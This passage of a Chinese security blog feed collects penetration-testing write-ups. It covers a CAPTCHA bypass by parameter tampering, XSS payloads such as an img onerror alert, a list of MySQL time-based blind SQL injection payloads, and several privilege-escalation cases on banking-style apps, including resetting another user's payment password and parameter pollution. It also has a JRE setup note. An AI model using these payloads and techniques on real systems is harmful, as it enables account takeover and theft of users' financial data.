案例分享</h3><p>这个分享的案例有一个奇怪的逻辑，在做一笔交易时，需要动过动态手机验证码验证的方式进行，获取短信验证码需要图形验证码进行校验。</p><p>But，无论这个图形验证码存在的目的是什么，获取图形验证码的请求中有一个参数recAccount是图形验证码的内容部分，那我可就……</p><p>直接把内容改成1234试试水。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.test.com/plate/tranVerificationCode.do?recAccount=1234567890&amp;recAccountName=&amp;trxCode=02&amp;format=JSON&amp;channel=undefined&amp;businessCode=undefined</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172913-1ec3817a-4d4e-1.png" alt="1.png"></p><p>修改过的recAccount到页面之后，验证码也就成了我修改后的1234，不用打码，直接自己愿意什么内容就是什么内容了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172918-21cf8db4-4d4e-1.png" alt="2.png"></p><p>每一笔交易也自然都可以顺利的无视图形验证码的限制了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190323172923-24eb8e1c-4d4e-1.png" alt="3.png"></p><h2 id="0x05-容我再想想"><a href="#0x05-容我再想想" class="headerlink" title="## 0x05 容我再想想"></a>## 0x05 容我再想想</h2><p>em……我突然想到，上面的案例中涉及的场景都是可以通过脚本来自动化的，但是如果在没有写脚本的情况下，能不能利用Bp现有的功能或插件来直接用，案例中的情况可以考虑通过插件Extractor和Bp自带的Marco的方式来结合使用，这样可以将bp指定范围内的请求均经过处理进行自动化的测试或者半自动化的测试。</p>]]></content>
      
      
        <tags>
            
            <tag> 越权姿势 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【翻旧账】XSS姿势日常学习之PHP $_Request</title>
      <link href="/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0POST/"/>
      <url>/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0POST/</url>
      <content type="html"><![CDATA[<h2 id="0×01-怎么开头"><a href="#0×01-怎么开头" class="headerlink" title="## 0×01 怎么开头"></a>## 0×01 怎么开头</h2><p>这个测试的对象说来很巧，原本站点是没有添加任何过滤的，直接通过在url末尾简单的绕过即可弹框。</p><blockquote><pre><code>http://www.test.com/test.php?name=&apos;&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre></blockquote><p>该漏洞已经修复，需要进行复测。</p><h2 id="0×02-难度升级"><a href="#0×02-难度升级" class="headerlink" title="## 0×02 难度升级"></a>## 0×02 难度升级</h2><p><img src="https://ooo.0o0.ooo/2017/07/05/595c89b939d9d.png" alt="fuce-01.png"></p><blockquote><p>上来访问一下就看到了这个，直接404，那么可能是已经修复了？还是链接已经失效(这个是自己YY的，可能点儿用没有2333)</p></blockquote><blockquote><p>修改为正常的url打开看看是什么情况。</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8b537e3b5.png" alt="fuce-02.png"></p><blockquote><p>可以正常访问，那已经修复了？所以用xsstrike来跑跑，前几天从twitter上看到大家都在转，正好抓到机会来测试</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8c13949bd.png" alt="fuce-03.png"></p><blockquote><p>看到这个的时候个人还觉得这也算修复了？果然还是被扫出来，换个姿势就可以，这么简单，结果就是浏览器打开的全是404，顿时就是各种卧槽。</p></blockquote><h2 id="0×03-去找大神"><a href="#0×03-去找大神" class="headerlink" title="## 0×03 去找大神"></a>## 0×03 去找大神</h2><blockquote><p>自己通过源码看到这里在通过url进行请求的时候，有一小段js是过滤掉了url中的字符，重定义到了404的。<br>还是去找大神,哈哈，因为总觉得还是可以弹窗的，尽管自己可能是YY。</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/07/05/595c8e32a3e6a.png" alt="fuce-04.png"></p><blockquote><p>大神告诉以下几点:  </p></blockquote><blockquote><ul><li>xsstrike 等xss扫描器只要不是基于webkit都是很容易误报的</li><li>这个点一开始自己用浏览器的js的解析逻辑，让后面的js先执行(目前看来没有方法)</li><li>不从js出发，猜php源码，结合js和源码，就可以得到答案</li><li>经过测试，后端是使用_requests来处理请求的，不是_get</li><li>所以问题的答案就很明显了</li></ul></blockquote><p>当吃在路上出完饭的我只能一路手机搜索，一路往回奔试试自己绞尽脑汁get到的点是不是对的，23333.还好，思路正确，没毛病。</p><p><img src="https://ooo.0o0.ooo/2017/07/05/595c9bb5dccdd.png" alt="fuce-06.png"></p><h2 id="0×04-欠一个payload"><a href="#0×04-欠一个payload" class="headerlink" title="## 0×04 欠一个payload"></a>## 0×04 欠一个payload</h2><h2 id="0×05-聊天记录就是最好的笔记了"><a href="#0×05-聊天记录就是最好的笔记了" class="headerlink" title="## 0×05 聊天记录就是最好的笔记了"></a>## 0×05 聊天记录就是最好的笔记了</h2><blockquote><pre><code>审计经验(php代码审计)php有集中获得请求的方式，_get,或者_post,还可能是_request尝试之后发现答案出来了</code></pre></blockquote><h4 id="“这个点需要一个脑洞，一点也不难-”"><a href="#“这个点需要一个脑洞，一点也不难-”" class="headerlink" title="#### “这个点需要一个脑洞，一点也不难.”"></a>#### “这个点需要一个脑洞，一点也不难.”</h4>]]></content>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【翻旧账】XSS姿势日常学习</title>
      <link href="/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/26/%E3%80%90%E7%BF%BB%E6%97%A7%E8%B4%A6%E3%80%91XSS%E5%A7%BF%E5%8A%BF%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="0×01-叉插×"><a href="#0×01-叉插×" class="headerlink" title="## 0×01 叉插×"></a>## 0×01 叉插×</h2><p>看到P牛博客里有一篇wooyun的《那些年我们没能bypass的XSS filter》, 想整理过来但是好像也并没有必要这么做，先印象笔记搞一波，然后自己慢慢积累一些思路和套路.</p><p>这篇文章自己放在文件夹的最底层，竟然没有看到，尴尬……直到今天还是被我发现了。</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="### example-1"></a>### example-1</h3><p>修改自己的简历信息，用户名限制了50的长度</p><p><img src="https://ooo.0o0.ooo/2017/06/06/59366445b7a5d.png" alt="2017060501.png"></p><p>过滤了一些标签，img标签没有被过滤，所以尝试插入，查看源码的时候发现插入的英文标点符号被替换为了中文的，所以普通的姿势应该是搞不定的了，换个地方搞，特此记录.</p><p><img src="https://ooo.0o0.ooo/2017/06/06/59366445d1bf9.png" alt="2017060502.png"></p><h3 id="example-2"><a href="#example-2" class="headerlink" title="### example-2"></a>### example-2</h3><p>今天遇到的情况是，搜索框反射型XSS。</p><p>用AWVS扫到了存在XSS，然后就开始各种尝试，直到用firebug看到报错看到源码，接下来开始努力构造闭合创造alert(1)。所以闭合了，但是并没有弹窗，问我斌哥之后成功弹窗.</p><p><img src="https://ooo.0o0.ooo/2017/06/07/5937ff5b3b87f.png" alt="2017060601.png"></p><blockquote><p>So, 什么才是正确的姿势呢?<br>“要跳出到函数内的一些判断(if等)外，尝试跳出函数才是一个好的反射xss.不然需要交互.”</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/07/5937ff5b54b87.png" alt="2017060602.png"></p><blockquote><pre><code>和前一天相比,今天的过滤了&quot;&lt;&gt;&quot;这些符号，并对这些符号进行了转义.</code></pre></blockquote><h3 id="example-3"><a href="#example-3" class="headerlink" title="### example-3"></a>### example-3</h3><p>今天遇到的情况,AWVS告诉我此处有个XSS，为毛自己搞不出来捏?</p><p><img src="https://ooo.0o0.ooo/2017/06/09/593a04149cd37.png" alt="2017060801.png"><br><img src="https://ooo.0o0.ooo/2017/06/09/593a0414b45c5.png" alt="2017060802.png"></p><blockquote><p>两张图结合起来看,应该是极有可能存在XSS的，但是多次尝试之后无果，这里过滤掉了&lt;()等符号，所以又去问斌哥，斌哥乃何许人也，说时迟那时快，啧啧~</p></blockquote><p><img src="https://ooo.0o0.ooo/2017/06/09/593a063b7fc7b.png" alt="2017060803.png"></p><p>所以又长见识了.</p><p><img src="https://ooo.0o0.ooo/2017/06/09/593a069481a55.png" alt="2017060804.png"></p>]]></content>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>降级安装jre</title>
      <link href="/2019/03/14/%E9%99%8D%E7%BA%A7%E5%AE%89%E8%A3%85jre/"/>
      <url>/2019/03/14/%E9%99%8D%E7%BA%A7%E5%AE%89%E8%A3%85jre/</url>
      <content type="html"><![CDATA[<h2 id="0x01-降级安装jre"><a href="#0x01-降级安装jre" class="headerlink" title="## 0x01 降级安装jre"></a>## 0x01 降级安装jre</h2><h3 id="卸载open-jdk"><a href="#卸载open-jdk" class="headerlink" title="### 卸载open-jdk"></a>### 卸载open-jdk</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载之前的java版本</span><br><span class="line">sudo apt-get remove openjdk*</span><br></pre></td></tr></table></figure><h3 id="降级安装"><a href="#降级安装" class="headerlink" title="### 降级安装"></a>### 降级安装</h3><ul><li><p>新建文件夹</p><blockquote><p>mkdir /usr/java/  </p></blockquote></li><li><p>下载rpm格式的jdk</p></li><li><p>安装</p><blockquote><p>rpm -ivh jdk-8u121-linux-x64.rpm –nodeps –force</p></blockquote></li><li><p>修改path配置文件</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_121</span><br><span class="line">JRE_HOME=/usr/java/jdk1.8.0_121/jre</span><br><span class="line">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME CLASS_PATH PATH</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> environment </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql ord()和ascii()</title>
      <link href="/2019/03/12/mysql%E7%9B%B2%E6%B3%A8%E7%9A%84%E4%B8%80%E7%82%B9%E7%9F%A5%E8%AF%86/"/>
      <url>/2019/03/12/mysql%E7%9B%B2%E6%B3%A8%E7%9A%84%E4%B8%80%E7%82%B9%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)**</p><p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)**</p><h2 id="0x00-语句"><a href="#0x00-语句" class="headerlink" title="# 0x00 语句"></a># 0x00 语句</h2><blockquote><p>if(ascii(substr((‘str’),pos,len)),sleep(5),1)</p></blockquote><h3 id="ASCII-str1"><a href="#ASCII-str1" class="headerlink" title="## ASCII(str1)"></a>## ASCII(str1)</h3><p>返回字符串的最左面字符串的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii('hi');</span><br><span class="line">+-------------+</span><br><span class="line">| ascii('hi') |</span><br><span class="line">+-------------+</span><br><span class="line">|         104 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ASCII('b')AS Lower_Case, ASCII('B') AS Upper_Case;</span><br><span class="line">+------------+------------+</span><br><span class="line">| Lower_Case | Upper_Case |</span><br><span class="line">+------------+------------+</span><br><span class="line">|         98 |         66 |</span><br><span class="line">+------------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="ord-str"><a href="#ord-str" class="headerlink" title="## ord(str)"></a>## ord(str)</h3><p>ord()函数返回字符串第一个字符的ASCII值。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord('h');</span><br><span class="line">+----------+</span><br><span class="line">| ord('h') |</span><br><span class="line">+----------+</span><br><span class="line">|      104 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="substr"><a href="#substr" class="headerlink" title="## substr()"></a>## substr()</h3><p>substr()函数用来截取数据库中的某一列字段中的一部分。</p><p>substr(str,pos,len);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(('Courtney'),1,9);</span><br><span class="line">+--------------------------+</span><br><span class="line">| substr(('Courtney'),1,9) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| Courtney                 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="if-函数"><a href="#if-函数" class="headerlink" title="## if()函数"></a>## if()函数</h3><p>表达式为：if(expr1,expr2,expr3)</p><ul><li>如果expr1的值为true，则返回expr2的值；</li><li>如果expr1的值为false，则返回expr3的值；</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(ascii(substr(('L'),1,1))=0,1,sleep(3));</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| if(ascii(substr(('L'),1,1))=0,1,sleep(3)) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                         0 |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure><h2 id="0x01-其他常用"><a href="#0x01-其他常用" class="headerlink" title="## 0x01 其他常用"></a>## 0x01 其他常用</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">' and if(1=0,1, sleep(10)) --+    </span><br><span class="line"><span class="string">" and if(1=0,1, sleep(10)) --+</span></span><br><span class="line"><span class="string">) and if(1=0,1, sleep(10)) --+</span></span><br><span class="line"><span class="string">') and if(1=0,1, sleep(10)) --+</span></span><br><span class="line">") and if(1=0,1, sleep(10)) --+</span><br><span class="line">If(ascii(substr(database(),1,1))=115,sleep(10),1)</span><br><span class="line"></span><br><span class="line">获取数据库表信息</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;60 %23</span><br><span class="line">获取列信息</span><br><span class="line">and (select length(column_name) from information_schema.columns where table_name=0x656d61696c73 limit 0,1)&gt;[num] %23</span><br><span class="line">获取字段名</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_name=0x656d61696c73 limit 0,1),1,1))&gt;60 %23</span><br><span class="line">获取当前记录的长度</span><br><span class="line">and (select count(*) from emails)&gt;0 %2</span><br></pre></td></tr></table></figure><h2 id="0x03-sqlmap-technique"><a href="#0x03-sqlmap-technique" class="headerlink" title="## 0x03 sqlmap technique"></a>## 0x03 sqlmap technique</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数：--technique</span><br><span class="line"></span><br><span class="line">这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</span><br><span class="line"></span><br><span class="line">支持的探测方式如下：</span><br><span class="line"></span><br><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑让我崩溃之越权姿势分享(续集)</title>
      <link href="/2019/02/06/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB(%E7%BB%AD%E9%9B%86)/"/>
      <url>/2019/02/06/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB(%E7%BB%AD%E9%9B%86)/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="# 0x01 前言"></a># 0x01 前言</h2><p>文章首发在<a href="https://xz.aliyun.com/t/4003" target="_blank" rel="noopener">先知社区-“逻辑让我崩溃之越权姿势分享(续集)”</a></p><p>上回书说道~说道哪儿忘了~我们接着再说说。<br>【PS: 这是自己在平时的测试中积累并值得分享的一些测试经验，可能不能将问题探究到多深入，希望文中的思路能有所用。】</p><h2 id="0x02-“躲起来的”Form表单"><a href="#0x02-“躲起来的”Form表单" class="headerlink" title="# 0x02 “躲起来的”Form表单"></a># 0x02 “躲起来的”Form表单</h2><h3 id="1-场景"><a href="#1-场景" class="headerlink" title="## 1. 场景"></a>## 1. 场景</h3><p>就像小节标题提到的一样，留意那些“躲起来的”Form表单，很多场景下你是否遇到过点击触发一个功能请求，但是返回的是空白或者“无记录”的提示，请求中不包含任何用户参数，这个时候你留意了，是不是有什么东西是你遗漏掉了，遗漏了什么触发条件？</p><h3 id="2-案例"><a href="#2-案例" class="headerlink" title="## 2. 案例"></a>## 2. 案例</h3><p>如图有一个这样的功能点，点击“信用卡”功能后，请求返回告诉你，该用户查询无记录。这个时候你要淡定了，So what？</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140316-91c5e2ea-238b-1.png" alt="案例101"></p><p>接下来你要做的是什么？对接口进行请求构造Fuzz？客官且慢……怕是你需要再确认一下，那个躲在Form表单里的action是不是为你早就备好了。</p><p>让我们看图说话。这是点击“分期付款”功能时候的请求，查询到当前登陆用户没有下挂账户，但是留意到最下面的那个hidden起来的form表单了某？</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140336-9d843b68-238b-1.png" alt="案例102"></p><p>让我们稍加修改，看看效果如何？看图说话。<br>将input框稍作修改，添加一个value，给前端添加一点可选择的账号的空隙余地。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140351-a6b0a85c-238b-1.png" alt="案例103"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140414-b46b1950-238b-1.png" alt="案例104"></p><p>再敲个回车，看看效果，看看是否后端已经对这个接口做了鉴权呢？是否可以~~~Bingo.</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140442-c530816c-238b-1.png" alt="案例105"></p><h3 id="3-多说几句"><a href="#3-多说几句" class="headerlink" title="## 3. 多说几句"></a>## 3. 多说几句</h3><p>上面的案例需要注意几点：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 是否存在隐藏的form表单；</span><br><span class="line">* 后端是否对此接口的查询操作作了鉴权判断；</span><br></pre></td></tr></table></figure></p><h2 id="0x03-“犄角旮旯”的越权"><a href="#0x03-“犄角旮旯”的越权" class="headerlink" title="# 0x03 “犄角旮旯”的越权"></a># 0x03 “犄角旮旯”的越权</h2><h3 id="1-场景-1"><a href="#1-场景-1" class="headerlink" title="## 1. 场景"></a>## 1. 场景</h3><p>”犄角旮旯“的越权，说起来是犄角旮旯，但其实真实有人测试的时候估计每个能点的地方都会触发一遍，所以你也会发现总有一些点光看按钮看不出个所以然。</p><h3 id="2-案例-1"><a href="#2-案例-1" class="headerlink" title="## 2. 案例"></a>## 2. 案例</h3><p>有这么一个查询接口查询历史交易明细，图中所示：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140504-d21a3418-238b-1.png" alt="案例201"><br>选择查询之后，出现了几个按钮，“保存”、“打印”、“显示所有”、“保存所有”，一般情况说来“查看明细”、“查看详情”、“xx详情”等描述的功能点都对应着某一流水单号的记录情况，如果应用的处理方式不是在功能请求时全部返回所有订单数据的话，那么这一点是极有可能存在问题的点。</p><p>此处的“详情”功能处已经做了鉴权，无法通过修改流水单号查询他人信息。但问题点出在“显示所有”的功能点，应用的逻辑是在查询全部记录时，会为每个用户对应一个id号，那么此处可以直接批量去查他人的账户交易信息，并且可以保存下载。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140518-dace4cf2-238b-1.png" alt="案例202"></p><p>如下图所示，查询所有数据时，请求中包含有FileName参数，为保存数据生成文档命名做准备。那剩下的只是遍历参数就好了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140534-e3ff6216-238b-1.png" alt="案例203"></p><h3 id="3-废话几句"><a href="#3-废话几句" class="headerlink" title="## 3. 废话几句"></a>## 3. 废话几句</h3><p>案例中涉及到的点为一些看起来没有用但是真实存在漏洞的接口，所以案例2的结论就是注意那些看似无害的”犄角旮旯“。常见的几点如：查询、详情、明细、下载记录等等功能点。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129142332-66d8c09a-238e-1.png" alt=""></p><h2 id="0x03-鸡肋越权"><a href="#0x03-鸡肋越权" class="headerlink" title="# 0x03 鸡肋越权"></a># 0x03 鸡肋越权</h2><h3 id="1-场景-2"><a href="#1-场景-2" class="headerlink" title="## 1. 场景"></a>## 1. 场景</h3><p>说是鸡肋越权，是因为在测试的时用了自己准备的两个测试账号，同时因为需要涉及到cookie的替换等操作，有人可能会说：“这也太扯了，你都替换了cookie参数了，查看别人的信息那是肯定可以的啊！”，但其实如果我下面的案例与你想的多少有些不符，也正好咱们一起来讨论这个场景下的替换，是否算不算是越权呢。</p><h3 id="2-案例-2"><a href="#2-案例-2" class="headerlink" title="## 2. 案例"></a>## 2. 案例</h3><p>此案例中涉及到的信息如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A和B两个测试账号，A为攻击者，B为受害者</span><br><span class="line">账户A未设置支付密码、B账户未知支付密码</span><br></pre></td></tr></table></figure><p>现同时登陆两个账号，获取cookie参数中的“mssc_sid”值。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140627-03a65408-238c-1.png" alt="案例3-0012"></p><p>之后对A账户进行操作，查看账户状态，显示未设置支付密码</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140653-133dfede-238c-1.png" alt="案例3-0013"></p><p>随后进行设置密码，点击<strong>“设置密码”</strong>后，会首先发送请求校验当前cookie参数中的mssc_sid值，通过这个值来对当前用户身份进行识别。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">这里为什么要用一个未设置支付密码的账户A呢？因为“未设置支付密码账户”在设置密码时与“已设置支付密码账户”不同，不需要校验原交易密码，可以直接进行设置操作。</span><br></pre></td></tr></table></figure><p>此过程中，拦截请求将此参数替换为B账户mssc_sid值，绕过原密码校验的同时，第一步<strong>“校验身份”</strong>会通过此账户识别为账户B，并进行到第二步，设置支付密码。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140737-2d6462ee-238c-1.png" alt="案例3-0014"></p><p>设置新的支付密码，有人会问，如果还有第二步，是不是也要同样的拦截请求并且修改mssc_sid参数，答案是<strong>当然不用了</strong>。虽然在这一步提交的请求包中mssc_sid参数值为A账户，后端以第一步校验的身份去设置密码，也就是设置B账户的交易密码会被修改，So，B账户支付密码被修改咯。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140804-3db7b4d4-238c-1.png" alt="案例3-002"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140812-420c733a-238c-1.png" alt="案例3-0016"></p><h3 id="3-小结"><a href="#3-小结" class="headerlink" title="## 3. 小结"></a>## 3. 小结</h3><p>这个案例有点鸡肋，并不可以任意的去重置某一用户的支付密码，希望给你了一点提示，下次遇到同样的参数，可以测试是否存在和案例中一样的问题逻辑。或许，当你遇到同样的情景时，你的漏洞参数是有规律可循的。</p><h2 id="0x04-再谈HPP"><a href="#0x04-再谈HPP" class="headerlink" title="# 0x04 再谈HPP"></a># 0x04 再谈HPP</h2><h3 id="1-场景-3"><a href="#1-场景-3" class="headerlink" title="## 1. 场景"></a>## 1. 场景</h3><p>HPP简称“HTTP Parameter Pollution”，HTTP参数污染，此处指就是给相同参数赋上两个或两个以上的值，导致应用解析错误出现越权漏洞。话不多说，相信有很多人都知道这种类型问题。</p><h3 id="2-案例-3"><a href="#2-案例-3" class="headerlink" title="## 2. 案例"></a>## 2. 案例</h3><p>此案例以修改账户别名为例，通过HPP的方式可以修改所有登陆账户的别名和手机号码。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140835-4fdb6a02-238c-1.png" alt="案例4-001"></p><p>在用户A登陆后，存在这样一个功能设置点，可以设置修改A账户的账户别名。便于用户在进行各类交易时操作，功能类似于电话本，方便查找使用。</p><p>问题出在修改这个功能点，当你设置A账户别名、手机号后，选择“确认修改“时，请求中包含一个PayeeId参数，对比两个不同的参数之后发现此处参数每个参数均代表唯一用户且在用户登陆状态下有效，另外我们可以看出，这个PayeeId编号前14位不变，后4位规律递增或随机的特征，OK，废话说多了，回到重点。</p><p>此处请求将别名设置为”1166661test“、手机号码设置为A账户手机号码，将B账户的PayeeId参数附带到当前账户PayeeId后，发现请求可以正常请求。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140853-5a624f7c-238c-1.png" alt="案例4-002"></p><p>通过最直观的方式，登陆B账户查看别名设置情况，我们不难发现B账户的账户别名已经设置为”1166661test“，同时手机号码也改为了A账户的手机号码。</p><p><strong>PS: 也许有人会问这个地方可以批量么？回答是当然可以，因为漏洞参数虽然是20位长度的字符串，但前14位不变，后四位就算不是递增，爆破的难度也不大。另结合此处的存储型XSS，可以将可利用程度提升。</strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129140912-661e9672-238c-1.png" alt="案例4-003"></p><h3 id="3-无废话可说"><a href="#3-无废话可说" class="headerlink" title="## 3. 无废话可说"></a>## 3. 无废话可说</h3><p>HPP已经有很多人知道的，所以没有什么特别要说明的，如果有人想要了解的话，自行去搜索吧，有很多很详细的解释。</p><h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p>自己尝试根据这两篇文做了个流程图，每个方式方法的最终归属看起来都还是回归到了常规越权，希望下次我还能发现不一样的问题来分享。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129145410-ae51b4be-2392-1.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 越权姿势 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FlaskDays-自定义url_for</title>
      <link href="/2019/01/01/FlaskDays-%E8%87%AA%E5%AE%9A%E4%B9%89url_for/"/>
      <url>/2019/01/01/FlaskDays-%E8%87%AA%E5%AE%9A%E4%B9%89url_for/</url>
